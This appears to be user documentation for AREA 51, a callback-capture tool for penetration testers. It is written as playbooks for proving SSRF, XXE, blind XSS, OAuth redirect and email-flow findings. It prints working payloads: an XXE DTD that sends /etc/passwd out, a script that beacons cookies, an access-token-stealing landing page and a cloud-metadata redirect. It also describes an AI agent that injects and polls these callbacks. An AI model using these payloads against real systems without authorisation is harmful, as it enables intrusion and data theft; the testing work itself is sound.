# Using AREA 51 in an engagement

Playbooks for the work itself: getting a callback to prove a finding, serving the
response a target needs to reach the next step, driving email flows, and handling
what you captured afterwards.

If you have not deployed yet, start with
[getting-started](getting-started.md).

## The mental model

Three nouns and you have the whole tool:

- A **black hole** is a hostname you own that captures everything. Every path on
  it, every address at it. `https://<black-hole.tld>/anything` is captured;
  `anything@<black-hole.tld>` is captured. Nothing needs to be created first.
- An **endpoint** is a row you add to change what a *specific* path answers with.
  Without one, a path answers `404! Not Found`, and the request is still
  captured. Endpoints exist to serve a target something, not to enable capture.
- A **capture** is the stored request or email. Requests keep method, full URL,
  IP, every header and the body. Emails keep the verbatim message, including
  attachments.

So the default posture, deploy and do nothing else, already catches every
callback. You only configure something when the target needs an *answer*.

Two other useful facts:

- Endpoint matching is **exact** on the path. `/cb` and `/cb/` are different
  rows, and there are no wildcards. Query strings are captured but never part of
  matching, so `/cb?token=x` hits the `/cb` endpoint.
- An [agent can read a bounded slice](#hand-the-engagement-to-an-agent) of this
  through Autopilot, and deliberately not all of it. It sees the last 60 minutes
  only, request envelopes without headers or bodies (it *can* fetch the raw
  `.eml`, within the window), and endpoints under `/-/` only. Blacklists, older
  captures, hand-crafted endpoints and request bodies stay dashboard-only.

---

## Before you start testing

1. **Pick your host.** On the dashboard's **Home** tab, click the black hole you
   want as the default. It is remembered per browser.
2. **Know your two payload shapes.** `https://<host>/<anything>` for HTTP
   callbacks, `<anything>@<host>` for email. Use a distinct path or local-part per
   test, so a captured hit names its own test when you come back to it a day
   later. `/ssrf-login-avatar`, `xxe-dtd@…`, that sort of thing.
3. **Copy URLs from the list.** The leading icon on an Endpoints row copies the
   endpoint's full URL to your clipboard, using the host you selected on Home.

Use one path per injection point. It costs nothing, and it turns the Requests tab
into a labeled result set instead of a pile of `/test` hits.

---

## Confirm a blind callback (SSRF)

The base case: something server-side fetches a URL, and you need proof.

1. Send `https://<host>/ssrf-<injection-point>` in the parameter under test. No
   setup required: an unconfigured path still captures, and answers `404`.
2. Open **Requests**. Search or pin the path fragment.
3. Open the row.

What the capture tells you, beyond "it fired":

| Field | What it is worth |
|---|---|
| `ip` | Egress IP of the fetching host, often a cloud NAT or a proxy you can name in the finding |
| `User-Agent` | Frequently identifies the library and version (`python-requests/2.31`, `Java/17`, `curl/8`), which narrows the sink |
| Headers | Internal tracing headers, service names, and sometimes an `Authorization` or cookie the target leaked |
| Body | Present when the sink does a POST, occasionally the whole document it was told to send |
| `ts` vs your request | Immediate = synchronous fetch; minutes later = a queue or scheduled job, which changes the exploit story |

Pin the path in the search bar and it stays highlighted with a color ribbon
across reloads while you keep testing.

## Control the response (redirects and metadata)

When the target has to follow your response somewhere, create a **text endpoint**
(**Endpoints → + New endpoint**), because text endpoints own their status and headers.

**Redirect into a filter bypass**, for SSRF that validates the first URL only:

```
URI      /r/metadata
Status   302
Headers  Location: http://169.254.169.254/latest/meta-data/
Body     (empty)
```

**Answer whatever content type the parser wants**, for SSRF that only follows a
"valid" response:

```
URI      /cb/json
Status   200
Headers  Content-Type: application/json
Body     {"status":"ok"}
```

**Relax CORS deliberately**, to prove browser-side exfiltration is possible:

```
Headers  Access-Control-Allow-Origin: *
         Access-Control-Allow-Credentials: true
```

A file-backed endpoint cannot do any of these, since uploads force `200` and
their own content type. Anything you need a custom status or header for is a text endpoint.

## Host a DTD for XXE exfiltration

Classic out-of-band XXE needs an external DTD served over HTTP, then a second
request carrying the data.

1. Create a text endpoint for the DTD:

   ```
   URI      /x/e.dtd
   Status   200
   Headers  Content-Type: application/xml-dtd
   Body     <!ENTITY % f SYSTEM "file:///etc/passwd">
            <!ENTITY % i "<!ENTITY &#x25; x SYSTEM 'https://<host>/x/out?d=%f;'>">
            %i;
   ```

2. Point the target's parser at `https://<host>/x/e.dtd`.
3. Watch **Requests** for the `/x/out` hit. The exfiltrated content arrives in
   the query string, which is stored as part of the full URL.

Long or newline-bearing content breaks a query-string channel; when it does, have
the second entity POST instead and read it from the request **body**, which has no
such limit.

Anything expressible as text is a text endpoint: DTD, XML, JSON, JavaScript, an
SVG, a `.well-known` document. Reach for an upload only for real
binaries ([below](#host-a-file-payload)).

## Catch a blind XSS beacon

1. Host the payload as a text endpoint with a JavaScript content type:

   ```
   URI      /x/b.js
   Headers  Content-Type: application/javascript
   Body     navigator.sendBeacon('https://<host>/x/hit?u='
              + encodeURIComponent(location) + '&c=' + encodeURIComponent(document.cookie))
   ```

2. Inject `<script src="https://<host>/x/b.js"></script>` (or an
   `import('https://<host>/x/b.js')` variant) into the stored field.
3. Every execution shows up twice in **Requests**: the script fetch, then the
   beacon. The beacon's `Referer` header tells you *which page* executed it,
   often an internal admin URL you had no other way to learn.

`sendBeacon` survives navigation better than `fetch` for a one-shot exfil. If the
page's CSP blocks a script source, the fetch hit alone still proves injection
reached a renderer.

## Drive email flows: signup, reset, verification

Every address at a mail-enabled black hole is live. There is nothing to create, so
invent an address per test.

1. Use `whatever+tag@<host>` in the target's signup, invite or reset form.
2. Open **Emails**. The message arrives with envelope metadata, and opening it
   fetches and parses the verbatim message: headers, the HTML body rendered in a
   strict sandbox, the plain-text alternative, and every attachment.
3. Click the link, or copy the token out of it.

What this unlocks that a normal inbox does not:

- **Unlimited identities** for testing tenant isolation, invite flows, and
  "one account per email" assumptions. Same domain, infinite local-parts.
- **Full headers** for the mail-security half of a report: `Received` chain, SPF
  / DKIM / DMARC results, the real sending infrastructure.
- **The raw message** via **Download Raw**, which is what you attach as evidence
  when a finding turns on exact content.
- **Attachments** kept and downloadable, so an "export emailed to the user"
  feature can be inspected rather than described.

A target that blasts the same subject at many aliases collapses into one
conversation row; click it to drill into every recipient. Bulk sender noise can be
silenced with the [email blacklist](#keep-the-noise-down).

## Intercept an OAuth `redirect_uri`

Registered-URI validation is often prefix-based, or absent.

1. Stage the landing page as an endpoint, `/-/oauth/cb` if you want an agent to
   be able to manage it, any path otherwise:

   ```
   URI      /-/oauth/cb
   Status   200
   Headers  Content-Type: text/html
   Body     <h1>ok</h1>
   ```

2. Put `https://<host>/-/oauth/cb` in `redirect_uri` and run the flow.
3. The captured request holds everything the flow put in the **query string**:
   `code`, `state`, and any token returned with `response_mode=query`.

**A fragment never reaches you.** In an implicit flow the token comes back as
`#access_token=…`, and browsers do not send fragments to the server, so it will
not appear in the capture no matter how long you wait. To get one, make the
landing page read it and call back:

```
URI      /-/oauth/cb
Status   200
Headers  Content-Type: text/html
Body     <script>navigator.sendBeacon('/x/tok?h=' + encodeURIComponent(location.hash))</script>
```

The `/x/tok` hit then carries the fragment in its own query string, where it *is*
captured. Confirm on that capture rather than on a browser screenshot.

The same shape proves open redirects (does the target bounce a browser to your
host?) and referrer leakage (does your capture show a `Referer` carrying a token
from the page before?).

## Host a file payload

For real binaries: an archive, a compiled artifact, a PDF, a font, a signed
blob, an image with something appended. Open **Endpoints → + New endpoint**, set the path,
drop the file on **Serve a file** (or click it to browse), and press **Create**.

- Served **inline** with the file's own detected content type and no
  `Content-Disposition`, because a hosted payload has to be fetched and executed
  by the target rather than downloaded.
- Up to **25 MB**, streamed rather than buffered.
- The response is server-owned: `200`, detected type, no custom headers. If you
  need a status or header, use a text endpoint.
- *Replace* swaps the bytes at the same path. *Remove* converts the row back to a
  text endpoint and deletes the object.

Uploads are a human action by design. An agent can see that an endpoint is
file-backed but cannot read, replace or delete it, so a payload you staged is
never destroyed by automation.

## Hand the engagement to an agent

Autopilot lets a Claude Code or Codex agent watch the black holes and stage its
own stubs, unattended. Register it once per machine:

```bash
claude mcp add autopilot https://<autopilot-host>/mcp \
  --transport http --header "Authorization: Bearer <the key ./a51 users printed>"
```

The agent gets eight tools: the last 60 minutes of requests and of emails, a raw
message by id, your configured black holes, and create / read / update / delete
over endpoints under the reserved `/-/*` path space.

In practice this means you can say *"probe every parameter on this endpoint for
SSRF and tell me which ones called back"* and the agent closes the loop itself.
It builds the callback URL, injects it, then polls `requests_recent_1hr` for the
hit.

The guardrails are worth knowing so you can predict what it will do:

| Boundary | Consequence |
|---|---|
| 60-minute read window, enforced in the database | An agent cannot mine your capture history, only the live engagement |
| Writes confined to `/-/*` | It can never touch an endpoint you crafted by hand |
| No access to the uploads bucket | It cannot read or clobber a file payload; it will ask you to upload one |
| Read-only on email state | Read/unread and starred are yours alone |

Full surface: [internals/autopilot](../internals/autopilot.md).

## Keep the noise down

A public hostname attracts scanners within hours of its certificate appearing in
the transparency logs. Two filters handle it, managed under **Settings** or
added in one click from the capture itself: a request's **Remote IP** row and an
email's **From** row each carry a *blacklist* button, which is usually how you
will reach for them.

- **IP blacklist.** A matching request gets `403` immediately. Nothing is
  stored, and the endpoint table is never consulted.
- **Email blacklist.** A matching sender is rejected at SMTP level, so their
  server generates the bounce. Nothing is stored.

Both are exact-match, and the workers cache each list for up to **60 minutes**, so
a change takes that long to take effect in both directions. They are a noise
filter, not a security control: the sender address in a mail header is trivially
forged.

Rather than blacklisting a busy scanner, it is often easier to pin your own test
paths in the search bar. The noise stays captured but out of your way.

## Evidence and clean-up

**During the engagement**

- **Star** what matters. A star is not a bookmark: starred email is exempt from
  the retention worker **and** from `./a51 purge`, so it is kept indefinitely
  while everything else ages out. Un-starring it makes it purgeable again.
- **Download Raw** on an email gives you the verbatim `.eml` for the report
  appendix.
- Screenshot the capture modal, not the list. It carries the timestamp, the
  full URL and the headers that make the proof legible.

**At the end**

```bash
./a51 purge
```

Requests older than N days, non-starred emails older than N days (rows and their
stored messages together), or every agent-staged `/-/*` endpoint. Then delete the
endpoints you crafted, so the next engagement starts from a clean namespace.

Captured data is client data: request bodies and inbound mail routinely contain
tokens, reset links and personal information. Treat the deployment as evidence
storage, keep retention short, and purge when the report ships.

---

## Which capture answers which question

| You want to know | Look at |
|---|---|
| Did the sink fire at all? | **Requests**, any hit on your path |
| What is the target's egress IP? | Request `ip` |
| What software made the request? | Request `User-Agent`, plus header order |
| Did it leak a token or an internal URL? | Request headers, query string, body |
| Which page executed my payload? | Request `Referer` |
| What did the application actually email? | **Emails**: headers, HTML body, attachments |
| Is their mail authentication sound? | Email headers: `Received`, SPF, DKIM, DMARC |
| Did the OAuth flow hand me a code? | Request URL on your `redirect_uri` path |
| Is anything still staged from last week? | **Endpoints**, and `./a51 purge` |
